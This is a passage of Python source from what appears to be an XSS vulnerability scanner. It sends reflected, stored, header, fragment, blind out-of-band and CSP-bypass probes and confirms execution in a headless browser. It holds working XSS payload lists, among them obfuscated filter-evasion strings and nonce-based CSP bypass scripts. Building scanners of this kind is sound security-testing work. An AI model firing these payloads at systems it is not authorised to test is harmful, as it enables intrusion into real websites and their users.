from __future__ import annotations

import json
import os
import re
import threading
import time
from concurrent.futures import as_completed
from queue import Queue
from typing import Any, Dict, List, Optional, Tuple

import logging
import requests
from playwright.sync_api import Error as PWError, sync_playwright
from sseclient import SSEClient

from csrf import apply_csrf
from dynamic_dom_tester import dynamic_dom_inspect, run_with_coverage
from network import make_request
from oast import build_beacon_vectors, check_paths_for_poll, generate_token
from payloads import DEFAULT_XSS_PAYLOADS
from sanitization_analyzer import filter_payload_by_sanitizer, mutate_payload_by_sanitizer
from tester_analysis import get_xss_severity, sink_location_labels as _sink_location_labels
from tester_browser import (
    PLAYWRIGHT_EXEC_INIT_SCRIPT as _PLAYWRIGHT_EXEC_INIT_SCRIPT,
    confirm_execution,
    is_playwright_available,
)
from tester_ui import (
    Panel,
    color,
    console,
    preview_payload as _preview_payload,
    print_progress as _print_progress,
    progress_newline as _progress_newline,
    short_url as _short_url,
    format_eta as _fmt_eta,
)
from tools.csp_bypass import collect_csp_bypass_payloads
from utils import (
    OOB_BASE_URL,
    _acquire_page,
    _release_page,
    contains_unescaped,
    decode_all,
    extract_nonces,
    fetch_dynamic_html,
    generate_encoding_variants,
    init_browser_pool,
    parse_csp,
    pool_available,
    prepare_request_args,
)

logger = logging.getLogger("xsscanner.tester")


PRIORITY_PAYLOADS = {
    "attr_focus": [
        '" autofocus onfocus="alert(document.domain)',
        '"autofocus/onfocus="alert(document.domain)',
        '"autofocus/onfocus="confirm&#40;document.domain&#41;',
        '" autofocus="" onfocus="alert(document.domain)',
        "' autofocus onfocus='alert(document.domain)'",
        " autofocus onfocus=alert(document.domain) ",
    ],
    "attr_breakout": [
        '"><script>alert(document.domain)</script>',
        '\'"><script>alert(document.domain)</script>',
    ],
    "js_string": [
        "'-alert(document.domain)-'",
        "\\'-alert(document.domain);<!--",
        "\\'-alert(document.domain);//",
        "'-alert(document.domain);//",
        '"-alert(document.domain);//',
        "';this[8680439..toString(30)](document.domain);//'",
        '"};this[8680439..toString(30)](document.domain);//"',
        '"};this[8680439..toString(30)](document.domain);{"',
        "'};this[8680439..toString(30)](document.domain);{'",
        "x';x=top[\"al\"%2B\"ert\"](document.domain);//",
        "x';x=this[\"al\"%2B\"ert\"](document.domain);//",
        "`;(self['al'+'ert']||top['al'+'ert'])(document.domain);//",
        "`;(Function('a','alert(document.domain)'))();//",
    ],
    "hash": [
        "#<script>alert(document.domain)</script>",
    ],
}


CONTEXT_TO_PAYLOADS = {
    "html_tag": ["html_tag_injection"],
    "script_tag": ["html_tag_injection"],
    "tag_comment": ["html_tag_injection"],
    "attr_quoted": ["attribute_breakout_dq", "attribute_breakout_sq"],
    "attr_unquoted": ["attribute_breakout_dq", "attribute_breakout_sq"],
    "data_attribute": ["attribute_breakout_dq", "attribute_breakout_sq"],
    "srcdoc_attr": ["attribute_breakout_dq", "attribute_breakout_sq"],
    "js_string": ["js_string_breakout_dq", "js_string_breakout_sq"],
    "js_template_literal": ["js_string_breakout_dq", "js_string_breakout_sq"],
    "jsx_expression": ["js_string_breakout_dq", "js_string_breakout_sq"],
    "template_literal": ["js_string_breakout_dq", "js_string_breakout_sq"],
    "uri_scheme": ["url_based"],
    "css_url": ["css_injection"],
    "css_expression": ["css_injection"],
    "polyglot": ["polyglot"],
    "event_handler": ["event_handler"],
    "onclick": ["event_handler"],
    "onmouseover": ["event_handler"],
    "onerror": ["event_handler"],
    "innerHTML": ["dom_clobbering"],
    "outerHTML": ["dom_clobbering"],
    "textContent": ["dom_clobbering"],
    "innerText": ["dom_clobbering"],
    "outerText": ["dom_clobbering"],
    "insertAdjacentHTML": ["dom_clobbering"],
    "insertAdjacentText": ["dom_clobbering"],
    "eval": ["dom_clobbering"],
    "Function": ["dom_clobbering"],
    "setTimeout-string": ["dom_clobbering"],
    "setInterval-string": ["dom_clobbering"],
    "encoding": ["encoding"],
    "template_engine": ["template_engine"],
    "vue_directive": ["event_handler", "js_string_breakout_dq", "js_string_breakout_sq"],
}


class XSSTesterPhasesMixin:
    # ----- Phase 2: Encoding Variants -----
    def _phase_encoding_plus(self, url, method, name, template, is_form, request_meta=None):
        """Versi lebih kuat: dukung POST JSON dan refleksi via contains_unescaped."""
        if getattr(self, "skip_encoding", False):
            return False
        flags = getattr(self, "_filter_profile_flags", {}) or {}
        if not flags.get("allow_html", True):
            return False
        tried = 0
        hits = 0
        reflections: List[Dict[str, Any]] = []
        try:
            total = 0
            for raw in DEFAULT_XSS_PAYLOADS["html_tag_injection"]:
                variants = generate_encoding_variants(raw) or {}
                total += 1 + len(variants)
        except Exception:
            total = 0
        t0 = time.time()
        _print_progress(f"[enc] {tried}/{total} hits={hits} ETA={_fmt_eta(total, tried, t0)}")
        for raw in DEFAULT_XSS_PAYLOADS["html_tag_injection"]:
            variants = {"raw": raw}
            try:
                variants.update(generate_encoding_variants(raw) or {})
            except Exception:
                pass
            items = list(variants.items())
            if len(items) > 16:
                items = items[:16]
            for tech, variant in items:
                tpl = dict(template)
                tpl[name] = variant
                req_url, extra_headers, body = prepare_request_args(url, method, tpl, is_form, request_meta=request_meta)

                content = ""
                target_url = req_url
                resp = None
                if method == "GET" and not is_form:
                    content = fetch_dynamic_html(req_url) or ""
                else:
                    headers = dict(extra_headers or {}) if extra_headers else {}
                    data = body
                    if method == "POST" and not is_form:
                        headers.setdefault("Content-Type", "application/json")
                        data = json.dumps(body) if isinstance(body, dict) else body
                    headers, data = apply_csrf(req_url, method, data if isinstance(data, dict) else {}, headers)
                    resp = make_request(req_url, method, data=data, headers=headers)
                    content = resp.text if resp else ""
                if resp and getattr(resp, "url", None):
                    target_url = resp.url

                tried += 1
                reflected = contains_unescaped(content, raw)
                if reflected:
                    hits += 1

                if not reflected:
                    if tried % self.progress_every == 0:
                        pv = _preview_payload(variant)
                        tgt = _short_url(target_url)
                        _print_progress(
                            f"[enc] {tried}/{total} hits={hits} ETA={_fmt_eta(total, tried, t0)} | {name}@{tgt} | pl: {pv}"
                        )
                    continue

                entry_idx = len(reflections) + 1
                executed = confirm_execution(target_url)
                reflections.append(
                    {
                        "idx": entry_idx,
                        "tech": tech,
                        "variant": variant,
                        "url": target_url,
                        "executed": executed,
                    }
                )
                status = "EXEC" if executed else "REFL"
                pv = _preview_payload(variant)
                tgt = _short_url(target_url)
                _print_progress(
                    f"[enc] {tried}/{total} hits={hits} #{entry_idx:03d} {status} ETA={_fmt_eta(total, tried, t0)} | {name}@{tgt} | pl: {pv}"
                )

                if executed:
                    _progress_newline()
                    console.print("[bold green]=== Encoding Execution Success ===[/bold green]")
                    console.print(f"[green]Technique[/green] : {tech}")
                    console.print(f"[green]Base[/green]      : {raw}")
                    console.print(f"[green]Variant[/green]   : {variant}")
                    console.print(f"[green]URL[/green]       : {target_url}")
                    f = {
                        "url": target_url,
                        "param": name,
                        "base_payload": raw,
                        "payload": variant,
                        "technique": tech,
                        "type": "encoding",
                    }
                    self.vulns.append(self._classify(f, executed=True))
                    return True
        if reflections:
            _progress_newline()
            summary_lines = []
            for item in reflections:
                status_txt = color("EXEC", "green") if item["executed"] else color("REFL", "yellow")
                tech_label = (item["tech"] or "raw").ljust(14)
                summary_lines.append(f"{item['idx']:02d}. {status_txt}  {tech_label} {_preview_payload(item['variant'])}")
            body = "\n".join(summary_lines)
            console.print(Panel(body, title="[cyan]Encoding reflections[/cyan]"))
        return False

    def _dispatch_payload(self, url, method, name, template, is_form, payload):
        tpl = dict(template)
        tpl[name] = payload
        req, _, body = prepare_request_args(url, method, tpl, is_form)
        if method == "GET" and not is_form:
            return make_request(req)
        headers = None
        data = body
        if method == "POST" and not is_form:
            headers = {"Content-Type": "application/json"}
            data = json.dumps(body) if isinstance(body, dict) else body
        headers, data = apply_csrf(req, method, data if isinstance(data, dict) else {}, headers)
        return make_request(req, method, data=data, headers=headers)

    def _phase_attr_focus(self, url, method, name, template, is_form, sanitizer_map):
        flags = getattr(self, "_filter_profile_flags", {}) or {}
        if not flags.get("allow_attr", True):
            return False
        tried = hits = 0
        t0 = time.time()
        _print_progress(f"[focus] tried={tried} hits={hits}")
        for raw in PRIORITY_PAYLOADS.get("attr_focus", []):
            tpl = dict(template)
            tpl[name] = raw
            resp = self._dispatch_payload(url, method, name, tpl, is_form, raw)
            tried += 1
            if not resp or not contains_unescaped(resp.text or "", raw):
                _print_progress(f"[focus] tried={tried} hits={hits}")
                continue
            hits += 1
            tgt = getattr(resp, "url", url)
            executed = confirm_execution(tgt)
            if executed:
                _progress_newline()
                console.print(
                    Panel(
                        f"URL: {tgt}\nParam: {name}\nPayload: {raw}",
                        title="[green]Autofocus Attr XSS[/green]",
                    )
                )
                self.vulns.append(
                    self._classify(
                        {"url": tgt, "param": name, "payload": raw, "type": "attr_focus"},
                        executed=True,
                    )
                )
                return True
            _print_progress(f"[focus] tried={tried} hits={hits} ETA={_fmt_eta(tried, hits, t0)}")
        return False

    def _phase_attr_breakout_known(self, url, method, name, template, is_form, sanitizer_map):
        flags = getattr(self, "_filter_profile_flags", {}) or {}
        if not flags.get("allow_attr", True):
            return False
        tried = hits = 0
        for payload in PRIORITY_PAYLOADS.get("attr_breakout", []):
            tpl = dict(template)
            tpl[name] = payload
            resp = self._dispatch_payload(url, method, name, tpl, is_form, payload)
            tried += 1
            if not resp or not contains_unescaped(resp.text or "", payload):
                continue
            hits += 1
            executed = confirm_execution(getattr(resp, "url", url))
            if executed:
                _progress_newline()
                console.print(
                    Panel(
                        f"URL: {resp.url}\nParam: {name}\nPayload: {payload}",
                        title="[green]Attribute Breakout XSS[/green]",
                    )
                )
                self.vulns.append(
                    self._classify(
                        {"url": resp.url, "param": name, "payload": payload, "type": "attr_breakout"},
                        executed=True,
                    )
                )
                return True
        return False

    def _phase_js_string_focus(self, url, method, name, template, is_form, sanitizer_map):
        flags = getattr(self, "_filter_profile_flags", {}) or {}
        if not flags.get("allow_js_string", True):
            return False
        tried = hits = 0
        for payload in PRIORITY_PAYLOADS.get("js_string", []):
            tpl = dict(template)
            tpl[name] = payload
            resp = self._dispatch_payload(url, method, name, tpl, is_form, payload)
            tried += 1
            if not resp or not contains_unescaped(resp.text or "", payload):
                continue
            hits += 1
            executed = confirm_execution(getattr(resp, "url", url))
            if executed:
                _progress_newline()
                console.print(
                    Panel(
                        f"URL: {resp.url}\nParam: {name}\nPayload: {payload}",
                        title="[green]JS String Breakout[/green]",
                    )
                )
                self.vulns.append(
                    self._classify(
                        {"url": resp.url, "param": name, "payload": payload, "type": "js_string_breakout"},
                        executed=True,
                    )
                )
                return True
        return False

    def _phase_hash_injection(self, url, method, name, template, is_form):
        flags = getattr(self, "_filter_profile_flags", {}) or {}
        if not flags.get("allow_url_scheme", True):
            return False
        tried = hits = 0
        tried_urls = set()
        for base_payload in PRIORITY_PAYLOADS.get("hash", []):
            tpl = dict(template)
            tpl[name] = base_payload
            req, _, body = prepare_request_args(url, method, tpl, is_form)
            target = req
            if method == "GET" and not is_form:
                make_request(req)
            else:
                headers = None
                data = body
                if method == "POST" and not is_form:
                    headers = {"Content-Type": "application/json"}
                    data = json.dumps(body) if isinstance(body, dict) else body
                headers, data = apply_csrf(req, method, data if isinstance(data, dict) else {}, headers)
                resp = make_request(req, method, data=data, headers=headers)
                target = getattr(resp, "url", req)
            if target in tried_urls:
                continue
            tried_urls.add(target)
            tried += 1
            executed = confirm_execution(target)
            if executed:
                hits += 1
                _progress_newline()
                console.print(
                    Panel(
                        f"URL: {target}\nParam: {name}\nPayload: {base_payload}",
                        title="[green]Hash Injection XSS[/green]",
                    )
                )
                self.vulns.append(
                    self._classify(
                        {"url": target, "param": name, "payload": base_payload, "type": "hash_injection"},
                        executed=True,
                    )
                )
                return True
        return False

    def _phase_encoding(self, url, method, name, template, is_form):
        for payload in DEFAULT_XSS_PAYLOADS.get("html_tag_injection", []):
            tpl = dict(template)
            tpl[name] = payload
            resp = self._dispatch_payload(url, method, name, tpl, is_form, payload)
            if resp and contains_unescaped(resp.text or "", payload):
                executed = confirm_execution(getattr(resp, "url", url))
                if executed:
                    _progress_newline()
                    console.print(
                        Panel(
                            f"URL: {resp.url}\nParam: {name}\nPayload: {payload}",
                            title="[green]Encoding XSS[/green]",
                        )
                    )
                    self.vulns.append(
                        self._classify(
                            {"url": resp.url, "param": name, "payload": payload, "type": "encoding"},
                            executed=True,
                        )
                    )
                    return True
        return False

    def _phase_oob(self, url, method, name, template, is_form, request_meta=None):
        config = getattr(self, "oob_config", {}) or {}
        provider = (config.get("provider") or getattr(self, "oob_provider", "internal") or "internal").lower()
        base_override = config.get("base_url") if provider != "internal" else config.get("base_url")

        token = generate_token()
        vectors = build_beacon_vectors(token, base_override) if base_override else build_beacon_vectors(token)

        sent = 0
        for key in ("js_fetch", "script_src", "img", "css_bg", "link"):
            payload = vectors.get(key)
            if not payload:
                continue
            tpl = dict(template)
            tpl[name] = payload
            oob_url, extra_headers, oob_body = prepare_request_args(url, method, tpl, is_form, request_meta=request_meta)
            try:
                if method == "GET" and not is_form:
                    fetch_dynamic_html(oob_url)
                else:
                    headers = dict(extra_headers or {}) if extra_headers else {}
                    data = oob_body
                    if method == "POST" and not is_form:
                        headers.setdefault("Content-Type", "application/json")
                        data = json.dumps(oob_body) if isinstance(oob_body, dict) else oob_body
                    headers, data = apply_csrf(oob_url, method, data if isinstance(data, dict) else {}, headers)
                    make_request(oob_url, method, data=data, headers=headers)
                sent += 1
            except Exception:
                continue

        _progress_newline()
        console.print(f"[debug] OAST beacons injected (provider={provider}): token={token} sent={sent}")

        if provider != "internal":
            poll_url = config.get("poll_url")
            if not poll_url:
                console.print("[yellow]Poll URL untuk penyedia OOB eksternal tidak dikonfigurasi. Lewati tahap blind XSS eksternal.[/yellow]")
                return False
            polls_headers = config.get("headers") or {}
            attempts = int(config.get("poll_attempts") or 20)
            interval = int(config.get("poll_interval") or 6)
            params = config.get("poll_params") or {}
            if self._poll_external_oob(poll_url, token, headers=polls_headers, params=params, attempts=attempts, interval=interval):
                self.vulns.append(
                    self._classify({"url": url, "param": name, "payload": f"<oast:{token}>", "type": "blind-xss"})
                )
                return True
            return False

        try:
            client = SSEClient(f"{OOB_BASE_URL}/{token}/events")
            for msg in client.events():
                data = msg.data.decode("utf-8", "ignore") if isinstance(msg.data, bytes) else msg.data
                _progress_newline()
                console.print(f"[bold green]Blind-XSS SSE![/bold green] data={data}")
                self.vulns.append(
                    self._classify({"url": url, "param": name, "payload": f"<oast:{token}>", "type": "blind-xss"})
                )
                return True
        except Exception:
            pass

        check_paths = check_paths_for_poll(token, base_override)
        for _ in range(20):
            time.sleep(1)
            for p in check_paths:
                try:
                    res = requests.get(p, timeout=5)
                    if res.ok and (res.headers.get("content-type", "")).startswith("application/json"):
                        if res.json().get("hit"):
                            console.print("[bold green]Blind-XSS Detected via polling![/bold green]")
                            self.vulns.append(
                                self._classify({"url": url, "param": name, "payload": f"<oast:{token}>", "type": "blind-xss"})
                            )
                            return True
                except Exception:
                    continue
        return False

    def _poll_external_oob(self, poll_url: str, token: str, headers: Optional[Dict[str, str]] = None, params: Optional[Dict[str, Any]] = None, attempts: int = 20, interval: int = 6) -> bool:
        if not poll_url:
            return False
        headers = headers or {}
        params = params or {}
        for _ in range(max(1, attempts)):
            try:
                if "{token}" in poll_url:
                    endpoint = poll_url.format(token=token)
                    response = requests.get(endpoint, timeout=10, headers=headers, params=params or None)
                else:
                    query = {"token": token}
                    query.update(params)
                    response = requests.get(poll_url, timeout=10, headers=headers, params=query)
                if response.ok:
                    try:
                        data = response.json()
                    except Exception:
                        data = {}
                    hits = data.get("hits") or data.get("events") or data.get("logs") or data.get("records")
                    if hits:
                        _progress_newline()
                        console.print("[bold green]Blind-XSS event tercatat oleh penyedia eksternal.[/bold green]")
                        return True
            except Exception as exc:
                logger.debug(f"External OOB polling error: {exc}")
            time.sleep(max(1, interval))
        return False

    def _phase_stored(self, url, method, name, template, is_form, request_meta=None):
        token = f"STOREDXSS-{int(time.time())}"
        token_js = json.dumps(token)
        payload_candidates = [
            f"<script>alert({token_js})</script>",
            f"<img src=x onerror=alert({token_js})>",
            f"<svg onload=alert({token_js})>",
            token,
        ]

        base_candidates_raw: List[str] = []
        try:
            from urllib.parse import urlparse

            p = urlparse(url)
            base_no_q = url.split("?")[0]
            root = f"{p.scheme}://{p.netloc}/"
            base_candidates_raw = [url, base_no_q, root]
        except Exception:
            base_candidates_raw = [url]

        base_candidates: List[str] = []
        for cand_url in base_candidates_raw:
            if cand_url and cand_url not in base_candidates:
                base_candidates.append(cand_url)

        revisit_candidates: set[str] = {u for u in base_candidates if u}

        for payload in payload_candidates:
            tpl = dict(template)
            tpl[name] = payload
            inj_url, extra_headers, body = prepare_request_args(url, method, tpl, is_form, request_meta=request_meta)
            resp = None
            try:
                if method == "GET" and not is_form:
                    resp = make_request(inj_url, headers=extra_headers or None)
                else:
                    headers = dict(extra_headers or {}) if extra_headers else {}
                    data = body
                    if method == "POST" and not is_form:
                        headers.setdefault("Content-Type", "application/json")
                        data = json.dumps(body) if isinstance(body, dict) else body
                    headers, data = apply_csrf(inj_url, method, data if isinstance(data, dict) else {}, headers)
                    resp = make_request(inj_url, method, data=data, headers=headers or None)
            except Exception:
                resp = None

            if inj_url:
                revisit_candidates.add(inj_url)
            resp_url = getattr(resp, "url", None)
            if resp_url:
                revisit_candidates.add(resp_url)

            try:
                time.sleep(0.4)
            except Exception:
                pass

            candidate_urls: List[str] = []
            for candidate in [*base_candidates, inj_url, resp_url]:
                if candidate and candidate not in candidate_urls:
                    candidate_urls.append(candidate)

        for target in candidate_urls:
            html = fetch_dynamic_html(target) or ""
            token_in_raw = token in html
            token_present = token_in_raw or contains_unescaped(html, token)
            if not token_present:
                continue
            if payload != token:
                payload_lower = payload.lower()
                required_markers: List[str] = []
                if "<script" in payload_lower:
                    required_markers.append("<script")
                if "<img" in payload_lower:
                    required_markers.append("<img")
                if "<svg" in payload_lower:
                    required_markers.append("<svg")
                if "onerror" in payload_lower:
                    required_markers.append("onerror")
                if "onload" in payload_lower:
                    required_markers.append("onload")
                if required_markers:
                    raw_lower = html.lower()
                    missing = [marker for marker in required_markers if marker not in raw_lower]
                    if missing:
                        logger.debug(
                            "[stored] reflection sanitized for %s; missing markers=%s",
                            target,
                            missing,
                        )
                        continue
            executed = confirm_execution(target)
            title = "[HIGH] Stored XSS Executed" if executed else "[INFO] Stored reflection detected"
            details = [f"URL: {target}", f"Param: {name}"]
            if payload == token:
                details.append(f"Marker: {token}")
            else:
                details.append(f"Payload: {payload}")
            _progress_newline()
            console.print(Panel("\n".join(details), title=title))
            finding_type = "stored" if executed else "stored_reflection"
            finding = {"url": target, "param": name, "payload": payload, "type": finding_type}
            self.vulns.append(self._classify(finding, executed=executed))
            return True

        try:
            for candidate in revisit_candidates:
                self.schedule_revisit(candidate, token, delay_seconds=300, note="stored-5min")
                self.schedule_revisit(candidate, token, delay_seconds=3600, note="stored-1h")
        except Exception:
            pass
        if is_form and is_playwright_available():
            if self._probe_stored_via_browser(url, name, template):
                return True
        return False

    def _phase_header_reflection(self, url, method, name, template, is_form, request_meta=None):
        probe = f"HDRPROBE-{int(time.time())}"
        headers_list = ["User-Agent", "Referer", "X-Forwarded-For", "X-Original-URL"]
        hits = 0
        for header_name in headers_list:
            try:
                headers = {header_name: probe}
                resp = make_request(url, method=method, data=None, headers=headers)
                if resp and contains_unescaped(resp.text or "", probe):
                    hits += 1
                    executed = confirm_execution(getattr(resp, "url", url))
                    if executed:
                        _progress_newline()
                        console.print(
                            Panel(
                                f"Header: {header_name}\nURL: {resp.url}\nParam: {name}\nPayload: {probe}",
                                title="[green]Header Reflection Executed[/green]",
                            )
                        )
                        self.vulns.append(
                            self._classify(
                                {"url": resp.url, "param": name, "payload": probe, "type": "header_reflection"},
                                executed=True,
                            )
                        )
                        return True
            except Exception:
                continue
        return hits > 0

    def _phase_path_fragment(self, url, method, name, template, is_form, request_meta=None):
        if method != "GET" or is_form:
            return False
        parsed = requests.utils.urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        path_payloads = [
            "<script>alert(1)</script>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
        ]
        fragment_named_payloads = [
            ("javascript:alert(1)", "<script>alert(1)</script>"),
            ("data:text/html,<script>alert(1)</script>", "<script>alert(1)</script>"),
        ]
        fragment_direct_payloads = [
            ("1' onerror='alert(1)", "onerror='alert(1)'"),
            ('1" onerror="alert(1)"', 'onerror="alert(1)"'),
            ("1 onerror=alert(1)", "onerror=alert(1)"),
        ]

        targets: List[Dict[str, Any]] = []
        for payload in path_payloads:
            targets.append({"url": f"{base}/{name}/{payload}", "marker": "<script>alert(1)</script>", "payload": payload, "kind": "path"})
        for payload, marker in fragment_named_payloads:
            targets.append({"url": f"{base}#{name}={payload}", "marker": marker, "payload": payload, "kind": "fragment"})
        for payload, marker in fragment_direct_payloads:
            targets.append({"url": f"{base}#{payload}", "marker": marker, "payload": payload, "kind": "fragment"})
        tried_path = tried_frag = hits_path = hits_frag = 0
        for target in targets:
            try:
                resp = make_request(target["url"])
            except Exception:
                continue
            if target["kind"] == "fragment":
                tried_frag += 1
            else:
                tried_path += 1
            marker = target["marker"]
            text = resp.text if resp else ""
            if resp and marker and contains_unescaped(text or "", marker):
                executed = confirm_execution(getattr(resp, "url", target["url"]))
                if executed:
                    _progress_newline()
                    console.print(
                        Panel(f"URL: {resp.url}\nPayload: {target.get('payload')}", title="[green]Path/Fragment XSS[/green]")
                    )
                    self.vulns.append(
                        self._classify(
                            {"url": resp.url, "param": name, "payload": target.get("payload"), "type": "path_fragment"},
                            executed=True,
                        )
                    )
                    return True
                if target["kind"] == "fragment":
                    hits_frag += 1
                else:
                    hits_path += 1
            else:
                _print_progress(
                    f"[path] tried={tried_path} hits={hits_path} | [frag] tried={tried_frag} hits={hits_frag} | last: {_short_url(target['url'])}"
                )
        return False

    def _probe_stored_via_browser(self, url: str, name: str, template: Dict[str, Any]) -> bool:
        payload_candidates = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
        ]
        for payload in payload_candidates:
            fields = dict(template or {})
            fields[name] = payload
            html, executed = self._submit_form_in_browser(url, fields)
            if not html:
                continue
            if contains_unescaped(html, payload) or executed:
                _progress_newline()
                title = "[HIGH] Stored XSS via form" if executed else "[INFO] Stored reflection via form"
                console.print(Panel(f"URL : {url}\nParam : {name}\nPayload : {payload}", title=title))
                finding = {"url": url, "param": name, "payload": payload, "type": "stored_form"}
                self.vulns.append(self._classify(finding, executed=executed))
                return True
        return False

    def _install_exec_script(self, page) -> None:
        try:
            page.add_init_script(_PLAYWRIGHT_EXEC_INIT_SCRIPT)
        except Exception:
            pass

    def _fill_and_submit_form(self, page, fields: Dict[str, Any], executed_flag: Dict[str, bool]) -> Optional[str]:
        field_names: List[str] = []
        for key, value in (fields or {}).items():
            if value is None:
                continue
            field_names.append(key)
            str_value = str(value)
            try:
                locator = page.locator(f'[name="{key}"]')
                if locator.count():
                    try:
                        locator.fill(str_value)
                    except Exception:
                        locator.evaluate("(el, val) => { el.value = val; }", str_value)
                    try:
                        locator.dispatch_event("input")
                        locator.dispatch_event("change")
                    except Exception:
                        pass
                    continue
            except Exception:
                pass
            try:
                page.evaluate(
                    """(name, val) => {
                        const el = document.querySelector(`[name="${name}"]`);
                        if (!el) return false;
                        el.value = val;
                        try {
                            el.dispatchEvent(new Event('input', {bubbles:true}));
                            el.dispatchEvent(new Event('change', {bubbles:true}));
                        } catch (e) {}
                        return true;
                    }""",
                    key,
                    str_value,
                )
            except Exception:
                continue

        try:
            submitted = page.evaluate(
                """(names) => {
                    let done = false;
                    (names || []).forEach((name) => {
                        if (done) return;
                        const el = document.querySelector(`[name="${name}"]`);
                        if (el && el.form) {
                            const form = el.form;
                            const submit = form.querySelector('[type=submit], button[type=submit], button:not([type])');
                            if (submit) {
                                submit.click();
                                done = true;
                            } else if (form.requestSubmit) {
                                form.requestSubmit();
                                done = true;
                            } else {
                                form.submit();
                                done = true;
                            }
                        }
                    });
                    return done;
                }""",
                field_names,
            )
            if not submitted:
                try:
                    page.locator("input[type=submit], button[type=submit], button:not([type])").first.click()
                except Exception:
                    pass
        except Exception:
            pass

        page.wait_for_timeout(1500)
        try:
            page.reload(wait_until="domcontentloaded", timeout=15000)
            page.wait_for_timeout(800)
        except Exception:
            pass

        try:
            executed_flag["value"] = executed_flag.get("value") or bool(page.evaluate("() => !!window.__xss_executed"))
        except Exception:
            pass

        try:
            html = page.content()
        except Exception:
            html = None
        return html

    def _submit_form_in_thread(self, url: str, fields: Dict[str, Any]) -> Tuple[Optional[str], bool]:
        result_q: Queue = Queue()

        def worker():
            executed_flag = {"value": False}
            try:
                if os.name == "nt":
                    try:
                        import asyncio

                        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
                    except Exception:
                        pass
                with sync_playwright() as pw:
                    browser = pw.chromium.launch(headless=True)
                    context = browser.new_context(java_script_enabled=True)
                    page = context.new_page()

                    def _on_dialog(d):
                        try:
                            executed_flag["value"] = True
                            d.dismiss()
                        except PWError:
                            pass

                    page.on("dialog", _on_dialog)
                    self._install_exec_script(page)
                    page.goto(url, wait_until="domcontentloaded", timeout=20000)
                    html = self._fill_and_submit_form(page, fields, executed_flag)

                    try:
                        page.close()
                    except Exception:
                        pass
                    try:
                        context.close()
                    except Exception:
                        pass
                    try:
                        browser.close()
                    except Exception:
                        pass

                    result_q.put((html, executed_flag["value"]))
            except Exception as exc:
                result_q.put(exc)

        thread = threading.Thread(target=worker, daemon=True)
        thread.start()
        thread.join(timeout=30)
        if thread.is_alive():
            logger.debug("[stored-playwright] worker timeout")
            return None, False
        result = result_q.get()
        if isinstance(result, Exception):
            logger.debug(f"[stored-playwright-thread] error: {result}")
            return None, False
        return result

    def _submit_form_in_browser(self, url: str, fields: Dict[str, Any]) -> Tuple[Optional[str], bool]:
        if not is_playwright_available():
            return None, False

        ctx = page = None
        pooled = False

        try:
            if pool_available() or init_browser_pool():
                ctx, page = _acquire_page()
                if ctx and page:
                    pooled = True
            if not pooled:
                return self._submit_form_in_thread(url, fields)

            executed_flag = {"value": False}

            def _on_dialog(d):
                try:
                    executed_flag["value"] = True
                    d.dismiss()
                except PWError:
                    pass

            try:
                page.on("dialog", _on_dialog)
                self._install_exec_script(page)
                page.goto(url, wait_until="domcontentloaded", timeout=20000)
                html = self._fill_and_submit_form(page, fields, executed_flag)
            finally:
                if ctx and page:
                    try:
                        _release_page(ctx, page)
                    except Exception:
                        pass
            return html, executed_flag["value"]
        except Exception:
            return None, False

    def _phase_csp(self, url, method, name, template, is_form, request_meta=None):
        try:
            head = make_request(url, method="HEAD", timeout=6)
            hdrs = getattr(head, "headers", {}) or {}
            directives = parse_csp(hdrs.get("Content-Security-Policy", ""))
            script_directive = directives.get("script-src") or directives.get("default-src", [])
            script_src = [s.strip() for s in script_directive]
            nonces_hdr = extract_nonces(script_src)
        except Exception:
            script_src, nonces_hdr = [], []

        html_main = None
        try:
            html_main = fetch_dynamic_html(url) or ""
        except Exception:
            html_main = None
        nonces_html = []
        if html_main:
            from utils import extract_nonces_from_html

            nonces_html = extract_nonces_from_html(html_main)

        nonces = list(dict.fromkeys(list(nonces_hdr) + list(nonces_html)))

        allow_data = any(s.lower().startswith("data:") for s in script_src)
        allow_blob = any(s.lower().startswith("blob:") for s in script_src)
        unsafe_inline = "'unsafe-inline'" in script_src
        unsafe_eval = "'unsafe-eval'" in script_src
        strict_dynamic = any(s.lower() == "'strict-dynamic'" for s in script_src)

        csp_payloads = []
        for n in nonces:
            csp_payloads.append(f'<script nonce="{n}">alert(1)</script>')
            csp_payloads.append(f'<script type="module" nonce="{n}">alert(1)</script>')
            if unsafe_eval:
                csp_payloads.append(f'<script nonce="{n}">new Function("alert(1)")()</script>')
            if strict_dynamic:
                csp_payloads.append(
                    "<script nonce=\"{n}\">var s=document.createElement('script');"
                    "s.text='alert(1)';document.body.appendChild(s);</script>".replace("{n}", n)
                )
            if allow_blob:
                csp_payloads.append(
                    "<script nonce=\"{n}\">"
                    "var b=new Blob(['alert(1)'],{type:'text/javascript'});"
                    "var u=URL.createObjectURL(b);var s=document.createElement('script');"
                    "s.src=u;document.body.appendChild(s);"
                    "</script>".replace("{n}", n)
                )
            if allow_data:
                csp_payloads.append(
                    "<script nonce=\"{n}\">var s=document.createElement('script');"
                    "s.src='data:text/javascript,alert(1)';document.body.appendChild(s);</script>".replace("{n}", n)
                )
                csp_payloads.append(
                    "<script type=\"module\" nonce=\"{n}\">import('data:text/javascript,alert(1)')</script>".replace(
                        "{n}", n
                    )
                )

        if unsafe_inline:
            csp_payloads.append("<script>alert(1)</script>")

        dataset_payloads = collect_csp_bypass_payloads(script_src)
        if dataset_payloads:
            csp_payloads.extend(dataset_payloads)

        if allow_data:
            csp_payloads.append('<script src="data:text/javascript,alert(1)"></script>')
        csp_payloads += ["<img src=x onerror=alert(1)>", "<svg onload=alert(1) />"]

        for p in csp_payloads:
            tpl = dict(template)
            tpl[name] = p
            url_csp, extra_headers, body_csp = prepare_request_args(url, method, tpl, is_form, request_meta=request_meta)
            resp = None
            if method == "GET" and not is_form:
                resp = make_request(url_csp, headers=extra_headers or None)
            else:
                headers = dict(extra_headers or {}) if extra_headers else {}
                data = body_csp
                if method == "POST" and not is_form:
                    headers.setdefault("Content-Type", "application/json")
                    data = json.dumps(body_csp) if isinstance(body_csp, dict) else body_csp
                headers, data = apply_csrf(url_csp, method, data if isinstance(data, dict) else {}, headers)
                resp = make_request(url_csp, method, data=data, headers=headers or None)
            if not resp:
                continue

            try:
                rendered = fetch_dynamic_html(resp.url) if (method == "GET" and not is_form) else (resp.text or "")
            except Exception:
                rendered = resp.text or ""

